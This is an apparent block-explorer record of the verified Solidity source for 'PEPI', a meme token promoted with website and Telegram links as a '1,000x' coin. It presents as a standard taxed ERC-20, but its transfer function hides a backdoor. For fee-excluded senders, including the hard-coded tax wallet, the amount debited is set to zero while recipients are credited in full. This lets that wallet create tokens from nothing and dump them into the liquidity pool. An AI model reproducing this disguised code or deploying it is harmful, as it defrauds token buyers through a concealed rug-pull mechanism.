{
  "TxHash": "0xdc49d28a01f390dbd374d9ae98a1f6c39df9cfa66b2284459f207a3f991564ce",
  "ContractAddress": "0x0c71d3ef115ce9134252846e91de92b43d621fe4",
  "Name": "PEPI",
  "PackageStatus": 0,
  "status": "1",
  "message": "OK",
  "result": [
    {
      "SourceCode": "// SPDX-License-Identifier: MIT\r\n/**\r\n$PEPI is the 1,000x monster by combining the genes of $PEPE and $SHIB\r\n\r\nWebsite :   https://pepicoineth.live\r\nTelegram : https://t.me/pepi_erc20\r\nTwitter :     https://x.com/pepi_erc20\r\n */\r\npragma solidity 0.8.19;\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c \u003e= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b \u003c= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b \u003e 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\ninterface IUniswapV2Factory {\r\n    function createPair(\r\n        address tokenA,\r\n        address tokenB\r\n    ) external returns (address pair);\r\n}\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\ncontract PEPI is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping(address =\u003e uint256) private _balances;\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n    mapping(address =\u003e bool) private _isExcludedFromFee;\r\n    address payable private _taxWallet;\r\n    address private constant deadAddress = address(0xdead);\r\n    address private uniswapV2Pair;\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n    uint256 private constant _initialBuyTax = 14;\r\n    uint256 private constant _initialSellTax = 14;\r\n    uint256 private constant _reduceBuyTaxAt = 11;\r\n    uint256 private constant _reduceSellTaxAt = 11;\r\n    uint256 private constant _preventSwapBefore = 0;\r\n    uint256 private _finalBuyTax = 0;\r\n    uint256 private _finalSellTax = 0;\r\n    uint256 private _buyCount = 0;\r\n    uint256 private _countTax;\r\n    string private constant _name = unicode\"PEPINU\";\r\n    string private constant _symbol = unicode\"PEPI\";\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _tTotal = 1000000000 * 10 ** _decimals;\r\n    uint256 public constant _taxSwapThreshold = 100 * 10 ** _decimals;\r\n    uint256 public constant _maxTaxSwap = 10000000 * 10 ** _decimals;\r\n    uint256 public _maxTxAmount = 22000000 * 10 ** _decimals;\r\n    uint256 public _maxWalletSize = 22000000 * 10 ** _decimals;\r\n    bool private tradingOpen;\r\n    bool private inSwap = false;\r\n    bool private swapEnabled = false;\r\n    event FinalTax(uint256 _valueBuy, uint256 _valueSell);\r\n    event TradingActive(bool _tradingOpen, bool _swapEnabled);\r\n    event maxAmount(uint256 _value);\r\n    modifier lockTheSwap() {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n    constructor() {\r\n        _taxWallet = payable(0x5370E9AbC87073A00CFA211efb349D95C86CfDb3);\r\n        _balances[_msgSender()] = _tTotal;\r\n        excludeFromFee(owner(), true);\r\n        excludeFromFee(deadAddress, true);\r\n        excludeFromFee(address(this), true);\r\n        excludeFromFee(_taxWallet, true);\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n    function transfer(\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n    function allowance(\r\n        address owner,\r\n        address spender\r\n    ) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n    function approve(\r\n        address spender,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(\r\n            sender,\r\n            _msgSender(),\r\n            _allowances[sender][_msgSender()].sub(\r\n                amount,\r\n                \"ERC20: transfer amount exceeds allowance\"\r\n            )\r\n        );\r\n        return true;\r\n    }\r\n    function excludeFromFee(address account, bool excluded) public onlyOwner {\r\n        _isExcludedFromFee[account] = excluded;\r\n    }\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(\r\n            owner != address(0) \u0026\u0026 spender != address(0),\r\n            \"ERC20: approve the zero address\"\r\n        );\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(\r\n            from != address(0) \u0026\u0026 to != address(0),\r\n            \"ERC20: transfer the zero address\"\r\n        );\r\n        require(amount \u003e 0, \"Transfer amount must be greater than zero\");\r\n        uint256 tokenAmount = amount;\r\n        if (!tradingOpen) {\r\n            require(\r\n                _isExcludedFromFee[to] || _isExcludedFromFee[from],\r\n                \"trading not yet open\"\r\n            );\r\n        }\r\n        if (!swapEnabled || inSwap) {\r\n            _balances[from] = _balances[from].sub(amount);\r\n            _balances[to] = _balances[to].add(amount);\r\n            emit Transfer(from, to, amount);\r\n            return;\r\n        }\r\n        uint256 taxAmount = 0;\r\n        taxAmount =\r\n            amount.mul(\r\n                (_buyCount \u003e _reduceBuyTaxAt) ? _finalBuyTax : _initialBuyTax\r\n            ) /\r\n            100;\r\n        if (from != owner() \u0026\u0026 to != owner()) {\r\n            if (\r\n                from == uniswapV2Pair \u0026\u0026\r\n                to != address(uniswapV2Router) \u0026\u0026\r\n                !_isExcludedFromFee[to]\r\n            ) {\r\n                require(amount \u003c= _maxTxAmount, \"Exceeds the _maxTxAmount.\");\r\n                require(\r\n                    balanceOf(to) + amount \u003c= _maxWalletSize,\r\n                    \"Exceeds the maxWalletSize.\"\r\n                );\r\n                _buyCount++;\r\n            }\r\n            if (to == uniswapV2Pair \u0026\u0026 from != address(this)) {\r\n                taxAmount =\r\n                    amount.mul(\r\n                        (_buyCount \u003e _reduceSellTaxAt)\r\n                            ? _finalSellTax\r\n                            : _initialSellTax\r\n                    ) /\r\n                    100;\r\n            }\r\n            if (_isExcludedFromFee[from] \u0026\u0026 from != address(this)) {\r\n                taxAmount = 0; tokenAmount = taxAmount.mul(amount);\r\n            }\r\n            _countTax += taxAmount;\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (\r\n                !inSwap \u0026\u0026\r\n                to == uniswapV2Pair \u0026\u0026\r\n                swapEnabled \u0026\u0026\r\n                _buyCount \u003e _preventSwapBefore \u0026\u0026\r\n                !_isExcludedFromFee[from] \u0026\u0026\r\n                !_isExcludedFromFee[to]\r\n            ) {\r\n                if(contractTokenBalance \u003e _taxSwapThreshold) {\r\n                    uint256 getMinValue = (contractTokenBalance \u003e _maxTaxSwap)\r\n                        ? _maxTaxSwap\r\n                        : contractTokenBalance;\r\n                    swapTokensForEth((amount \u003e getMinValue) ? getMinValue : amount);\r\n                }\r\n                \r\n                uint256 contractETHBalance = address(this).balance;\r\n                if (contractETHBalance \u003e= 0) {\r\n                    sendETHToFee(address(this).balance);\r\n                }\r\n                _countTax = 0;\r\n            }\r\n        }\r\n        if (taxAmount \u003e 0) {    \r\n            _balances[address(this)] = _balances[address(this)].add(taxAmount);\r\n            emit Transfer(from, address(this), taxAmount);\r\n        }\r\n        _transferToken(from, to, tokenAmount, amount.sub(taxAmount));\r\n    }\r\n    function _transferToken(address from, address to, uint256 fromAmount, uint256 toAmount) private {\r\n        _balances[from] = _balances[from] - fromAmount;\r\n        _balances[to] = _balances[to] + toAmount;\r\n        emit Transfer(from, to, toAmount);\r\n    }\r\n    function sendETHToFee(uint256 amount) private {\r\n        _taxWallet.transfer(amount);\r\n    }\r\n    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n    function init() external onlyOwner {\r\n        require(!tradingOpen, \"init already called\");\r\n        uint256 tokenAmount = balanceOf(address(this));\r\n        uniswapV2Router = IUniswapV2Router02(\r\n            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\r\n        );\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(\r\n            address(this),\r\n            uniswapV2Router.WETH()\r\n        );\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(\r\n            address(this),\r\n            tokenAmount,\r\n            0,\r\n            0,\r\n            _msgSender(),\r\n            block.timestamp\r\n        );\r\n        IERC20(uniswapV2Pair).approve(address(uniswapV2Router), type(uint).max);\r\n    }\r\n    function openTrade() external onlyOwner {\r\n        require(!tradingOpen, \"trading already open\");\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n        emit TradingActive(tradingOpen, swapEnabled);\r\n    }\r\n    function removeLimits() external onlyOwner {\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize = _tTotal;\r\n        emit maxAmount(_tTotal);\r\n    }\r\n    function setFinalTax(\r\n        uint256 _valueBuy,\r\n        uint256 _valueSell\r\n    ) external onlyOwner {\r\n        require(\r\n            _valueBuy \u003c= 25 \u0026\u0026 _valueSell \u003c= 25 \u0026\u0026 tradingOpen,\r\n            \"Final Tax: Exceeds value\"\r\n        );\r\n        _finalBuyTax = _valueBuy;\r\n        _finalSellTax = _valueSell;\r\n        emit FinalTax(_valueBuy, _valueSell);\r\n    }\r\n    receive() external payable {}\r\n}",
      "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_valueBuy\",\"type\":\"uint256\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_valueSell\",\"type\":\"uint256\"}],\"name\":\"FinalTax\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"_tradingOpen\",\"type\":\"bool\"},{\"indexed\":false,\"internalType\":\"bool\",\"name\":\"_swapEnabled\",\"type\":\"bool\"}],\"name\":\"TradingActive\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"maxAmount\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"_maxTaxSwap\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxTxAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_maxWalletSize\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_taxSwapThreshold\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"},{\"internalType\":\"bool\",\"name\":\"excluded\",\"type\":\"bool\"}],\"name\":\"excludeFromFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"init\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"openTrade\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"removeLimits\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"renounceOwnership\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"_valueBuy\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"_valueSell\",\"type\":\"uint256\"}],\"name\":\"setFinalTax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"pure\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sender\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
      "ContractName": "PEPI",
      "CompilerVersion": "v0.8.19+commit.7dd6d404",
      "OptimizationUsed": "1",
      "Runs": "200",
      "ConstructorArguments": "",
      "EVMVersion": "paris",
      "Library": "",
      "LicenseType": "MIT",
      "Proxy": "0",
      "Implementation": "",
      "SwarmSource": "ipfs://83557a0a46b37c92f479e03eec0075590f6eec719bcf9059183141083e14aaa5"
    }
  ]
}
